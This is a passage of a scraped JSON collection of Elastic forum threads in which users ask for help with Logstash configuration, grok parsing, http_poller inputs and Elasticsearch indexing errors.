    "author": "stcdarrell",
    "date": "April 6, 2020, 8:47pm April 7, 2020, 3:24pm",
    "body": "hi, i'm querying shodan.io with some ip addresses.. every so often i get this message : [2020-04-06T20:37:51,625][WARN ][logstash.outputs.elasticsearch][darkwebrdp-hospitals] Could not index event to Elasticsearch. {:status=>400, :action=>[\"index\", {:_id=>nil, :_index=>\"darkwebrdp-hospitals\", :_type=>\"_doc\", :routing=>nil}, #<LogStash::Event:0x5e471612>], :response=>{\"index\"=>{\"_index\"=>\"dw-clinic\", \"_type\"=>\"_doc\", \"_id\"=>\"sSk2UXEBT27AkRjbsxsZ\", \"status\"=>400, \"error\"=>{\"type\"=>\"mapper_parsing_exception\", \"reason\"=>\"failed to parse field [shodan.body.data.ssl.cert.serial] of type [long] in document with id 'sSk2UXEBT27AkRjbsxsZ'. Preview of field's value: '5839668960810396903895068807565469154'\", \"caused_by\"=>{\"type\"=>\"i_o_exception\", \"reason\"=>\"Numeric value (5839668960810396903895068807565469154) out of range of long (-9223372036854775808 - 9223372036854775807)\\n at [Source: org.elasticsearch.common.bytes.BytesReference$MarkSupportingStreamInputWrapper@21da2d84; line: 1, column: 11107]\"}}}}} i think i get it.. that field \"shodan.body.data.ssl.cert.serial\" is too long for a long type variable.. and its freaking out.. i've tried converting it to a string, i've tried removing it entirely (i dont need it), i've tried replacing any value in there with \"na\", i've tried replacing that value with 0.. nothing works. i've tried both: [shodan.body.data.ssl.cert.serial] [shodan][body][data][ssl][cert][serial] i'm out of ideas.. any suggestions would be appreciated",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "82b1d79d-d35c-460e-8be4-48f533c4e1aa",
    "url": "https://discuss.elastic.co/t/need-help-with-key-value-pair-extraction/226819",
    "title": "Need help with key-value pair extraction",
    "category": [
      "Logstash"
    ],
    "author": "Nithani25",
    "date": "April 7, 2020, 5:11am April 7, 2020, 3:17pm",
    "body": "HI Team, I have split last field of my message has greedydata, however in some case, i have some key-value pair which needs extraction. key-value format message: CurrentURL = /google/search , UserID = nishchen83 I want to extract CurrentURL & userid from such messages. Request help for grok for extracting this kv pair.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "44b79330-db45-431b-8d7f-8304a9e1c165",
    "url": "https://discuss.elastic.co/t/move-to-pipeline-to-pipeline-communiction/226379",
    "title": "Move to pipeline-to-pipeline communiction",
    "category": [
      "Logstash"
    ],
    "author": "victor.nilsson",
    "date": "April 3, 2020, 9:59am April 7, 2020, 5:48am April 7, 2020, 3:16pm",
    "body": "Hi, Today we have a pretty complicated single pipeline comprised mostly of a lot of conditionals to route everything to its right place. One issue with this that we've noticed is if a output goes down, it affects the whole pipeline. What we want to do is the following: Send from logstash to two different elasticsearch endpoints, but the same documents. Today an example output looks like this: else if \"syslog\" in [tags] and \"sql_successful\" in [tags] and [cendotServiceName] == \"service-audit\" and [vd] == \"vd01\" { elasticsearch { ilm_enabled => true ilm_rollover_alias => \"daily\" ilm_pattern => \"000001\" ilm_policy => \"SIZE-30_AGE-30_DEL-365\" hosts => [\"10.229.1.12:9200\", \"10.229.1.13:9200\"] user => logstash_internal password => password } elasticsearch { #manage_template => false hosts => [\"192.168.1.10:9200\"] index => \"logs_write\" user => \"admin\" ilm_enabled => \"false\" password => \"password\" ssl => true ssl_certificate_verification => false } } How would we go about changing this configuration to support a second pipeline? We basically want to move the \"second\" elasticsearch output to a new pipeline. I would imagine something like this? else if \"syslog\" in [tags] and \"sql_successful\" in [tags] and [cendotServiceName] == \"service-audit\" and [vd] == \"vd01\" { elasticsearch { ilm_enabled => true ilm_rollover_alias => \"daily\" ilm_pattern => \"000001\" ilm_policy => \"SIZE-30_AGE-30_DEL-365\" hosts => [\"10.229.1.12:9200\", \"10.229.1.13:9200\"] user => logstash_internal password => password } pipeline { send_to => \"second_pipeline\" } } Where \"second_pipeline\" just contains the following? output { elasticsearch { #manage_template => false hosts => [\"192.168.1.10:9200\"] index => \"logs_write\" user => \"admin\" ilm_enabled => \"false\" password => \"password\" ssl => true ssl_certificate_verification => false } }",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "66dfc423-f56b-40fc-8c57-228818b8af12",
    "url": "https://discuss.elastic.co/t/help-with-basic-filtering-of-eventid-from-winlogbeat/226909",
    "title": "Help with basic filtering of eventID from winlogbeat",
    "category": [
      "Logstash"
    ],
    "author": "sbagciva",
    "date": "April 7, 2020, 1:42pm April 7, 2020, 2:37pm April 7, 2020, 3:06pm",
    "body": "so Im trying to filter out a event code in my logstash conf file.. so I have the basic conf.. input { beats { port => .... type => \"log\" } } to filter I put this filter { if [type] == \"wineventlog\" and [event_id] == 33205 { drop { } } } ... this filter doesnt work and gives me errors?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "29c90e6e-e3bc-49cf-8fda-b3ef98ccc6a2",
    "url": "https://discuss.elastic.co/t/how-to-configure-filebeat-for-logstash-cluster-environment/226851",
    "title": "How to configure filebeat for logstash cluster environment?",
    "category": [
      "Logstash"
    ],
    "author": "manish.sapariya",
    "date": "April 7, 2020, 8:20am April 7, 2020, 8:28am April 7, 2020, 8:45am April 7, 2020, 2:52pm",
    "body": "I am missing something very basic when I think of how Filebeat will be configured in a clustered logstash setup. As per the article https://www.elastic.co/guide/en/logstash/current/deploying-and-scaling.html and this architecture diagram in the article, I think that there is some kind of load balancer in front of the logstash cluster. However, the Filebeat output documentation suggests that there must be an array of all the Logstatsh nodes specified. Using this list of nodes, Filebeat will do the load balancing from the client-side. Also as per https://github.com/elastic/logstash/issues/2632 GitHub issue, there is no native logstash clustering available yet. So, my question is, what kind of setup do I need to be able to point my multiple Filebeat to one logstash service endpoint without specifying the logstash nodes in the cluster? Is it possible? Would having load balancer in front of Logstash cluster be of any help? Thanks, Manish",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "4761d278-ceeb-4a67-a98e-f3eb5408eb2a",
    "url": "https://discuss.elastic.co/t/logstash-does-not-show-outout-in-the-console-while-using-file-plugin-but-when-i-give-same-input-from-stdin-the-out-is-printed-in-the-console/226872",
    "title": "Logstash does not show outout in the console while using file plugin. But when i give same input from stdin the out is printed in the console",
    "category": [
      "Logstash"
    ],
    "author": "saikumar374265",
    "date": "April 7, 2020, 10:14am April 7, 2020, 2:50pm",
    "body": "logstash does not show outout in the console while using file plugin. But when i give same input from stdin the out is printed in the console. Here is my config file input { file { path => \"C:\\Users\\503160527\\test.log\" start_position => \"beginning\" sincedb_path => \"NUL\" } } output { stdout { codec => rubydebug } file{ path => \"C:\\Users\\503160527\\ELK\\Data\\test2.txt\" } }",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "58a3d1ba-32fb-42c1-a517-6e302c4b1261",
    "url": "https://discuss.elastic.co/t/the-differences-between-timestamp-and-time-in-log-file/226804",
    "title": "The differences between @timestamp and time in log file",
    "category": [
      "Logstash"
    ],
    "author": "lusynda",
    "date": "April 7, 2020, 1:27am April 7, 2020, 12:41pm April 7, 2020, 2:48pm",
    "body": "Hi all I have a question about the @timestamp, i know that @timestamp are what generate by logstash but i dont really know how it work. For ex: i have a server that are config with time that are wrong. It set the date time to year 2030. So when logstash index the event to elastic it index to the year 2030 index instead of 2020 index, i thought that the @timestamp are gen at the moment that logstash process the file. But in this case the @timestamp are gen according to the time of the server. Thank for your time.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "925c1efe-dd9c-4107-afce-2b64ed5771c0",
    "url": "https://discuss.elastic.co/t/log-stash-service-not-generating-logs/226887",
    "title": "Log stash service not generating logs",
    "category": [
      "Logstash"
    ],
    "author": "Seetharaman_K",
    "date": "April 7, 2020, 2:43pm",
    "body": "All , below is the only one one content am seeing in the log file , [2020-04-07T11:32:07,198][WARN ][logstash.runner ] SIGINT received. Shutting down. [2020-04-07T11:32:10,086][INFO ][logstash.javapipeline ] Pipeline terminated {\"pipeline.id\"=>\"main\"} [2020-04-07T11:32:10,228][FATAL][logstash.runner ] SIGINT received. Terminating immediately.. service is running . it is creating some indices also. but some of the indices are not created so wna know excatly what is happening , with out logging its very difficult. any help will be appreciated",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "80901a8d-cf9d-4fde-8974-a61018bd8be5",
    "url": "https://discuss.elastic.co/t/how-to-ingest-kv-field-values-as-seperate-records-in-kibana/226904",
    "title": "How to ingest kv field values as seperate records in kibana",
    "category": [
      "Logstash"
    ],
    "author": "Mithuna",
    "date": "April 7, 2020, 1:28pm",
    "body": "Hi, I'm trying to ingest API data into kibana with Logstash. In this i'm not getting the value as expected. My config file is input { stdin{} http_poller { urls => { q1 => { method => get user => \"me\" password => \"mypassword\" url => \"myurl\" headers => { Accept => \"application/json\" \"Content-Type\" => \"application/json\" } } } keepalive => false request_timeout => 900000 socket_timeout => 1800 codec => \"plain\" # Supports \"cron\", \"every\", \"at\" and \"in\" schedules by rufus scheduler schedule => { cron => \"*/5 * * * * UTC\"} metadata_target => \"http_poller_metadata\" } } filter { kv { remove_char_key => \"{}\\+\" remove_char_value => \"{}\\+\" field_split => \",\" value_split => \":\" source => message } mutate { remove_field => \"message\" } } output{ stdout { codec => rubydebug } elasticsearch { action => \"index\" index => \"myindex\" hosts => [\"localhost:9200\"] } } i'm getting the output as follows: \"\"Teams_AgentAssignment_connectedOn\"\" => [ [0] \"\"2020-04-02T15:45:32.698\"\", [1] \"\"2020-04-02T15:34:55.480\"\" ], \"\"Dialogs_ChatSession_isAbandoned\"\" => [ [0] \"false\", [1] \"false\" ], \"\"Teams_AgentAssignment_timeStamp\"\" => [ [0] \"\"2020-04-02T15:45:32.698\"\", [1] \"\"2020-04-02T15:34:55.480\"\" ], but i need it as seperate records in kibana like: \"Teams_AgentAssignment_connectedOn\" => \"2020-04-02T15:45:32.698\", \"Dialogs_ChatSession_isAbandoned\" => \"false\", \"Teams_AgentAssignment_timeStamp\" => \"2020-04-02T15:45:32.698\", Please help me in getting this. Thanks, Mithuna",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "d3f450b2-42cf-416a-9dcd-68f750c88148",
    "url": "https://discuss.elastic.co/t/logstash-not-sending-packetbeat-geoip-data-to-elastic-via-logstash/226903",
    "title": "Logstash not sending Packetbeat GeoIP data to Elastic via Logstash",
    "category": [
      "Logstash"
    ],
    "author": "",
    "date": "April 7, 2020, 1:25pm",
    "body": "",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "cd92c84f-04db-4342-bcc8-7fbc36cebee8",
    "url": "https://discuss.elastic.co/t/logstash-typeerror-no-implicit-conversion-of-nil-into-string/224219",
    "title": "Logstash: TypeError: no implicit conversion of nil into string",
    "category": [
      "Logstash"
    ],
    "author": "manojkrishna561994",
    "date": "March 19, 2020, 6:23am March 22, 2020, 4:14pm April 7, 2020, 12:48pm",
    "body": "I'm new to ELK and trying to input 3rd party REST API to Logstash to feed data into it. I'm getting TypeError: no implicit conversion of nil into string. I'm using http_input_poller plugin to feed data. Here is configuration for it. input { http_poller { urls => { test1 => \"https://example.com/api/now/table/sys_user?sysparm_limit=1\" } request_timeout => 60 # Supports \"cron\", \"every\", \"at\" and \"in\" schedules by rufus scheduler schedule => { cron => \"* * * * * UTC\"} codec => \"json\" # A hash of request metadata info (timing, response headers, etc.) will be sent here metadata_target => \"http_poller_metadata\" } } output { stdout { codec => rubydebug } } I'm using this command to run sudo ./logstash -f logstash_http_poller.conf --path.settings /etc/logstash/ --path.data I'm getting this error message masteradmin@usr:/usr/share/logstash/bin$ sudo ./logstash -f logstash_http_poller.conf --path.settings /etc/logstash/ --path.data [FATAL] 2020-03-18 07:07:07.377 [main] runner - An unexpected error occurred! {:error=>#<TypeError: no implicit conversion of nil into String>, :backtrace=>[\"org/jruby/RubyFileTest.java:96:in `directory?'\", \"org/jruby/RubyFileTest.java:88:in `directory?'\", \"/usr/share/logstash/logstash-core/lib/logstash/settings.rb:510:in `block in value'\", \"org/jruby/RubyKernel.java:1906:in `tap'\", \"/usr/share/logstash/logstash-core/lib/logstash/settings.rb:509:in `value'\", \"/usr/share/logstash/logstash-core/lib/logstash/settings.rb:97:in `get_value'\", \"/usr/share/logstash/logstash-core/lib/logstash/environment.rb:94:in `block in LogStash'\", \"/usr/share/logstash/logstash-core/lib/logstash/settings.rb:167:in `block in post_process'\", \"org/jruby/RubyArray.java:1814:in `each'\", \"/usr/share/logstash/logstash-core/lib/logstash/settings.rb:166:in `post_process'\", \"/usr/share/logstash/logstash-core/lib/logstash/util/settings_helper.rb:26:in `post_process'\", \"/usr/share/logstash/logstash-core/lib/logstash/runner.rb:246:in `execute'\", \"/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/clamp-0.6.5/lib/clamp/command.rb:67:in `run'\", \"/usr/share/logstash/logstash-core/lib/logstash/runner.rb:242:in `run'\", \"/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/clamp-0.6.5/lib/clamp/command.rb:132:in `run'\", \"/usr/share/logstash/lib/bootstrap/environment.rb:73:in `<main>'\"]} [ERROR] 2020-03-18 07:07:07.386 [main] Logstash - java.lang.IllegalStateException: Logstash Need help. Thanks",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "09260506-b894-4932-86d8-0e86ab1e208c",
    "url": "https://discuss.elastic.co/t/syslogs-sent-to-wrong-index/226734",
    "title": "Syslogs sent to wrong index",
    "category": [
      "Logstash"
    ],
    "author": "Roger_Westgren",
    "date": "April 6, 2020, 2:38pm April 6, 2020, 4:08pm April 7, 2020, 6:26am April 7, 2020, 12:41pm April 7, 2020, 12:18pm April 7, 2020, 12:41pm",
    "body": "Hi! I have a weird problem with my Logstash configuration. There are 2 .conf files in /etc/logstash/conf.d (beats.conf and syslog.conf). image1896×762 19.9 KB All the Beats agents get sent to port 5043 (beats.conf), and that's working fine, but I can't find the index pattern to create the syslog-* index. Instead I find this new index (which is the index in the beats.conf file): image918×393 28.4 KB So I got curious and created the index pattern \"%{[@metadata][beat]}-*\" and when I check it in the Discover tab all the syslog logs are there. Port 5140 is listening, both udp and tcp. image1046×393 13.1 KB I can't figure out why this is happening and can't seem to find any one else with the same problem when I search the web. Can anyone help? Many thanks!",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "fdf292ec-1a16-46a8-9803-100933147a0c",
    "url": "https://discuss.elastic.co/t/multiple-http-filters-at-the-same-time/226839",
    "title": "Multiple http filters at the same time",
    "category": [
      "Logstash"
    ],
    "author": "akhilsharma.in",
    "date": "April 7, 2020, 7:18am April 7, 2020, 8:31am April 7, 2020, 9:32am April 7, 2020, 10:18am April 7, 2020, 10:31am April 7, 2020, 10:36am April 7, 2020, 10:49am April 7, 2020, 11:30am April 7, 2020, 11:54am",
    "body": "Hi Team, Does Logstash support multiple http filters at the same time? Please confirm.",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "6ad9cf41-bb6d-4fe1-b638-e85196c9ec06",
    "url": "https://discuss.elastic.co/t/http-poller-plugin-index-document-issue/226884",
    "title": "Http_poller_plugin: Index document issue",
    "category": [
      "Logstash"
    ],
    "author": "manojkrishna561994",
    "date": "April 7, 2020, 11:47am",
    "body": "I'm using http_poller_plugin in order to fetch the logs for every 2 mins. Index is getting created and the data is also seen when the visualization is created, however, after completing every 1.30 mins (or so..) the data is getting vanished for almost 20 seconds considering the data size, again it is repopulating the data and the respective visualizations created with that data is also getting loaded after the mentioned time. Is there a way to not let this data getting vanished for 20-30 sec (or so..). Here is my config file http_poller { urls => { test1 => { method => get user => \"xxxxx\" password => \"xxxxx\" url => \"http://0.0.0.0:3000/Message/0012365ff30af9497ebb88c35a6df756\" headers => { Accept => \"application/json\" } } } keepalive => false request_timeout => 180 connect_timeout => 60 socket_timeout => 180 schedule => { cron => \"/2 * * * * UTC\"} codec => \"json\" metadata_target => \"http_poller_metadata\" } } output { elasticsearch{ hosts => [\"localhost:9200\"] index => \"one_7apr\" document_id => \"%{doc_id}\" failure_type_logging_whitelist => [409] sniffing => false doc_as_upsert => true } stdout { codec => rubydebug } }```",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "ecd676dc-7d00-4eec-b9e6-315ca751aab3",
    "url": "https://discuss.elastic.co/t/logstash-filter-on-number/223474",
    "title": "Logstash filter on number",
    "category": [
      "Logstash"
    ],
    "author": "kamandohl",
    "date": "March 13, 2020, 8:26am March 13, 2020, 5:54pm April 7, 2020, 10:42am",
    "body": "Trying to filter on an number, in this case 4624, in Logstash. But unable to get it to work. I was able to key off of event.kind, but that is a word and all events have that, so not an option. I have looked for days and unable to find anyone that has had the same issue, but no such luck. Thanks. Example: \"event\": { \"code\": 4624, \"kind\": \"event\", \"created\": \"2020-03-13T08:06:30.606Z\", \"action\": \"Logon\" Filters I have tried. if [event][code] == \"4624\" { mutate { add_tag => [ \"testing\" ] } } if \"4624\" in [event][code] { mutate { add_tag => [ \"testing\" ] } } if [4624] in [event][code] { mutate { add_tag => [ \"testing\" ] } } } if [event][code] =~ \"4624\" { mutate { add_tag => [ \"testing\" ] } if [event][code] =~ 4624 { mutate { add_tag => [ \"testing\" ] } } }",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "a5db42da-0c82-40d7-9823-4b2340f79b17",
    "url": "https://discuss.elastic.co/t/how-to-make-this-json-array-as-csv-data/226775",
    "title": "How to make this json array as csv data",
    "category": [
      "Logstash"
    ],
    "author": "rkhapre",
    "date": "April 6, 2020, 8:36pm April 7, 2020, 3:42am",
    "body": "Hi All I have json data like this [{ \"jsondata\": [\"123456\", \"description1\", \"notes1\", \"information1\", 9] }, { \"jsondata\": [\"44555\", \"description2\", \"notes2\", \"information2\", 8] } ] I need the output in csv format like this 123456,description1,notes1,information1,9 44555,description2,notes2,information2,8 I have tried this in filters split{field => \"message\"} mutate{gsub => [ \"jsondata\", \"[ ]\",\"\"] csv{ source => \"jsondata\" columns => [\"header1\", \"header2\",\"header3\", \"header4\",\"header5\"] separator => \",\" } Please let me know how to solve this Thanks",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "81a8d4aa-8fdc-439a-aef4-a6be8c921b3a",
    "url": "https://discuss.elastic.co/t/extracting-the-json-fields-from-the-message/226590",
    "title": "Extracting the JSON fields from the message",
    "category": [
      "Logstash"
    ],
    "author": "Raed",
    "date": "April 5, 2020, 7:15pm April 5, 2020, 7:28pm April 5, 2020, 10:33pm April 5, 2020, 10:54pm April 5, 2020, 11:15pm April 5, 2020, 11:31pm April 7, 2020, 1:34am April 6, 2020, 12:17am April 7, 2020, 1:34am April 7, 2020, 1:57am",
    "body": "I'm getting the below JSON as a message: { \"requestUrl\": \"http://localhost:8080/frameworks/298\", \"requestUri\": \"/frameworks/298\", \"requestMethod\": \"PUT\", \"requestHeaders\": { \"authorization\": \"***\", \"accept-language\": \"en\", \"content-type\": \"application/json\" }, \"requestBody\": { \"name\": \"NodeJs\" } } Using the below filter my whole JSON gets printed in a field called message in Kibana which is fine. but when I try to extract a specific attribute in the JSON It didn't work. filter { json { source => \"message\" } mutate { add_field => { \"requestUrl\" => \"%{[message][requestUrl]}\" \"requestUri\" => \"%{[message][requestUri]}\" \"requestMethod\" => \"%{[message][requestMethod]}\" \"requestHeaders\" => \"%{[message][requestHeaders]}\" \"requestBody\" => \"%{[message][requestBody]}\" } } } All I want is to add a field in Kibana called \"requestUrl\" and it should contain the requestUrl value in the JSON. Screen Shot 2020-04-05 at 10.05.42 PM763×416 59.4 KB",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "dcc75b25-41d2-4e69-a247-4e313b0931bc",
    "url": "https://discuss.elastic.co/t/grok-help-specificity/226802",
    "title": "Grok Help - specificity?",
    "category": [
      "Logstash"
    ],
    "author": "almathden",
    "date": "April 7, 2020, 1:00am",
    "body": "Hey Team, trying to match my watchguard logs. Depending on the log entry the format varies pretty wildly so I have a few different matches set up. Problem is matching a new entry I'm working on is...too generic? And so it matches everything. Generic entry: HA-M300Active (2020-04-07T00:36:11) sessiond[2325]: process status xpath /toSessiond/updateActivity Working fine: HA-M300Active (2020-04-06T22:35:53) firewall: msg_id=\"3000-0151\" Allow 1-LAN-P1 6-Internet-P6 udp 10.1.2.2 8.8.8.8 45410 53 duration=\"30\" sent_bytes=\"59\" rcvd_bytes=\"91\" (Allow Out - DNS-00) Here's how I am matching it now, and I guess I just need to learn how to be more specific. %{IPORHOST:syslog_host} \\(%{TIMESTAMP_ISO8601:log_date}\\) %{SYSLOGPROG}: %{DATA:content} So that matches, and puts the \"process status xpath /toSessiond/updateActivity\" in the content entry. But the other entry ends up with this as \"content\": msg_id=\"3000-0151\" And of course this is all tossed away: Allow 1-LAN-P1 6-Internet-P6 udp 10.1.2.2 8.8.8.8 45410 53 duration=\"30\" sent_bytes=\"59\" rcvd_bytes=\"91\" (Allow Out - DNS-00) I tried putting the less specific match last but that doesn't seem to have helped. Help?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "fd337588-972d-4be4-8eee-0f9aee2455d6",
    "url": "https://discuss.elastic.co/t/how-to-output-records-that-come-up-as-an-error-or-not-an-error-but-not-ingested-properly-into-a-separate-file/226766",
    "title": "How to output records that come up as an error or not an error but not ingested properly into a separate file",
    "category": [
      "Logstash"
    ],
    "author": "edster",
    "date": "April 6, 2020, 7:56pm",
    "body": "How can I output records that come up either as errors or simply aren't ingested or read properly for whatever reason (ie syntax or something of the sort) into a separate file?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "edae6e2f-5926-4244-a58e-8634ef39a764",
    "url": "https://discuss.elastic.co/t/tell-logstash-to-ignore-old-files-in-s3-bucket/226759",
    "title": "Tell Logstash to ignore old files in s3 bucket",
    "category": [
      "Logstash"
    ],
    "author": "clarkritchie",
    "date": "April 6, 2020, 6:12pm April 6, 2020, 7:04pm April 6, 2020, 7:47pm",
    "body": "I'm using the Logstash s3 plugin to ingest logs from a partner's S3 bucket. Logstash itself runs in a container, so its sincedb is not persistent. When the container re-starts, Logstash restarts and begins ingesting logs from that bucket since the beginning of time. delete or backup_to_bucket is not really an option because it's not my bucket to manage. Is there a way I can tell Logstash to ignore anything older than ~1 day? Can I seed sincedb with a date? e.g. before Logstash starts, can I echo a date in the format 2020-01-31 07:01:33 +0000 (where that date is ~one day ago) to: /var/lib/logstash/plugins/inputs/s3 What is the syntax for the hash on the name of the sincedb file? e.g. sincedb_ca090558edfcc5759ac626c813a5a2c2. Or I can just make this whatever I want and use sincedb_path. Any other suggestions? Thanks in advance. -Clark",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "f7bf34ee-bb46-4c56-a1eb-96d59cfb68db",
    "url": "https://discuss.elastic.co/t/logstash-working-on-linux-but-not-on-windows-with-same-config-files/223587",
    "title": "Logstash working on Linux but not on Windows with same config files",
    "category": [
      "Logstash"
    ],
    "author": "Mehak_Bhargava",
    "date": "March 13, 2020, 10:51pm April 6, 2020, 7:23pm April 6, 2020, 7:23pm",
    "body": "I have one logstash configuration file which I am using for logs coming from both Windows and linux environment. I have the same filebeat configuration for both environment. The log file being shipped via filebeats is also same. Still, the grok filters are not filtering fields on logs coming from windows, whereas they are being filtered for the same log file from linux. I added an exact same log line in my log file, on both windows and linux environment to compare the JSON output to see why grok filter is working on linux but not on windows?? Below is my filebeat.yml from windows- filebeat.inputs: - type: log enabled: true input_type: log fields: tags: [\"windows\"] # Paths that should be crawled and fetched. Glob based paths. paths: - 'C:\\Program Files (x86)\\ESQ SST\\Logs\\ngta-common.log' #multiline.pattern: '^[0-9]{4}-[0-9]{2}-[0-9]{2}' #multiline.negate: true #multiline.match: after output.logstash: # The Logstash hosts hosts: [\"xxx.xxx.xx.xx:5044\"] logging.level: debug logging.to_files: true logging.files: path: D:\\filebeat\\logs name: filebeat.log keepfiles: 7 Below is my filebeat.yml from linux- filebeat.inputs: - type: log enabled: true input_type: log paths: - /home/mehak/Documents/filebeat-7.5.2-linux-x86_64/logs/ngta-common.log fields: tags: linux Below is my filebeat.log from windows- #filebeat from windows with same log line 2020-03-13T14:42:03.459-0700 DEBUG [processors] processing/processors.go:186 Publish event: { \"@timestamp\": \"2020-03-13T21:42:03.458Z\", \"@metadata\": { \"beat\": \"filebeat\", \"type\": \"_doc\", \"version\": \"7.5.2\" }, \"agent\": { \"hostname\": \"GlobalDemo\", \"id\": \"980ab6dc-bb04-4b43-abf1-32348b8090a6\", \"version\": \"7.5.2\", \"type\": \"filebeat\", \"ephemeral_id\": \"84e006db-c202-41ae-80b9-27a230b265a0\" }, \"log\": { \"offset\": 2994, \"file\": { \"path\": \"C:\\\\Program Files (x86)\\\\ESQ SST\\\\Logs\\\\ngta-common.log\" } }, \"message\": \"2020-09-09 09:09:09,700 [dcbh478642637-76487] DEBUG c.e.n.c.r.LogEvent - Same log message\", \"input\": { \"type\": \"log\" }, \"fields\": { \"tags\": [ \"windows\" ] }, \"ecs\": { \"version\": \"1.1.0\" }, \"host\": { \"name\": \"GlobalDemo\" } } Below is my filebeat.log from linux- #filebeat from linux with same log line 2020-03-13T14:43:11.016-0700 DEBUG [processors] processing/processors.go:186 Publish event: { \"@timestamp\": \"2020-03-13T21:43:11.016Z\", \"@metadata\": { \"beat\": \"filebeat\", \"type\": \"_doc\", \"version\": \"7.5.2\" }, \"fields\": { \"tags\": \"linux\" }, \"ecs\": { \"version\": \"1.1.0\" }, \"host\": { \"name\": \"mehak-VirtualBox\" }, \"agent\": { \"type\": \"filebeat\", \"ephemeral_id\": \"ab7a7bdd-e852-430d-9574-3e42edbdcaaf\", \"hostname\": \"mehak-VirtualBox\", \"id\": \"26a23073-4272-498d-88ca-892985226e9f\", \"version\": \"7.5.2\" }, \"log\": { \"offset\": 6593, \"file\": { \"path\": \"/home/mehak/Documents/filebeat-7.5.2-linux-x86_64/logs/ngta-common.log\" } }, \"message\": \"2020-09-09 09:09:09,700 [dcbh478642637-76487] DEBUG c.e.n.c.r.LogEvent - Same log message\", \"input\": { \"type\": \"log\" } } Below is my logstash stdout when Logstash sends to Elasticsearch for linux logs where we can see log message, javaClass, log level, time stamp fields being extracted- #logstash from linux with same log line [2020-03-13T14:43:12,215][DEBUG][logstash.filters.grok ][test] Event now: {:event=>#<LogStash::Event:0x297b0f99>} { \"timestamp\" => \"2020-09-09 09:09:09,700\", \"logmessage\" => \" - Same log\", \"message\" => \"2020-09-09 09:09:09,700 [dcbh478642637-76487] DEBUG c.e.n.c.r.LogEvent - Same log message\", \"input\" => { \"type\" => \"log\" }, \"agent\" => { \"type\" => \"filebeat\", \"ephemeral_id\" => \"ab7a7bdd-e852-430d-9574-3e42edbdcaaf\", \"version\" => \"7.5.2\", \"hostname\" => \"mehak-VirtualBox\", \"id\" => \"26a23073-4272-498d-88ca-892985226e9f\" }, \"log\" => { \"file\" => { \"path\" => \"/home/mehak/Documents/filebeat-7.5.2-linux-x86_64/logs/ngta-common.log\" }, \"offset\" => 6593 }, \"fields\" => { \"tags\" => \"linux\" }, \"tags\" => [ [0] \"beats_input_codec_plain_applied\" ], \"javaClass\" => \"c.e.n.c.r.LogEvent\", \"loglevel\" => \"DEBUG\", \"@version\" => \"1\", \"@timestamp\" => 2020-03-13T21:43:11.016Z, \"ecs\" => { \"version\" => \"1.1.0\" }, \"host\" => { \"name\" => \"mehak-VirtualBox\" } } Below is my logstash stdout when Logstash sends to Elasticsearch for windows logs. Here we can see neither of the fields Such as log level, log message or javaClass are extracted like they are in Linux above - #logstash from windows with same log line { \"fields\" => { \"tags\" => [ [0] \"windows\" ] }, \"ecs\" => { \"version\" => \"1.1.0\" }, \"host\" => { \"name\" => \"GlobalDemo\" }, \"agent\" => { \"version\" => \"7.5.2\", \"ephemeral_id\" => \"84e006db-c202-41ae-80b9-27a230b265a0\", \"type\" => \"filebeat\", \"hostname\" => \"GlobalDemo\", \"id\" => \"980ab6dc-bb04-4b43-abf1-32348b8090a6\" }, \"tags\" => [ [0] \"beats_input_codec_plain_applied\" ], \"@version\" => \"1\", \"message\" => \"2020-09-09 09:09:09,700 [dcbh478642637-76487] DEBUG c.e.n.c.r.LogEvent - Same log message\", \"@timestamp\" => 2020-03-13T21:42:03.458Z, \"input\" => { \"type\" => \"log\" }, \"log\" => { \"file\" => { \"path\" => \"C:\\\\Program Files (x86)\\\\ESQ SST\\\\Logs\\\\ngta-common.log\" }, \"offset\" => 2994 } } And lastly, my logstash config file- #listening on this port input { beats { port => 5044 } } filter { if [fields][tags] == \"linux\" { #mutate { #add_field => { \"host\" => \"%{[event_data][IpAddress]}\" } #} grok{ match => { \"message\" => [ \"%{TIMESTAMP_ISO8601:timestamp}%{SPACE}\\[%{GREEDYDATA}\\]%{SPACE}%{LOGLEVEL:loglevel}%{SPACE}%{JAVACLASS:javaClass}%{GREEDYDATA:logmessage} \" ] add_tag => [\"_grokparsefailure\"] } } }if [fields][tags] == \"windows\" { #mutate { #add_field => { \"host\" => \"%{[event_data][IpAddress]}\" } #} grok{ match => { \"message\" => [ \"%{TIMESTAMP_ISO8601:timestamp}%{SPACE}\\[%{GREEDYDATA}\\]%{SPACE}%{LOGLEVEL:loglevel}%{SPACE}%{JAVACLASS:javaClass}%{GREEDYDATA:logmessage} \" ] add_tag => [\"_grokparsefailure\"] } } } } output { elasticsearch { hosts => [\"localhost:9200\"] sniffing => true manage_template => false ilm_enabled => false index => \"%{[fields][tags]}\" } stdout { codec => rubydebug } } Why are fields such as logmessage, log level not being extracted from windows logs whereas they are being extracted red from Linux as seen above?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "6ab82709-d3ff-479e-aabf-9dddae403fe8",
    "url": "https://discuss.elastic.co/t/pipeline-not-reading-csv-files/226749",
    "title": "Pipeline not reading csv files",
    "category": [
      "Logstash"
    ],
    "author": "elasticforme",
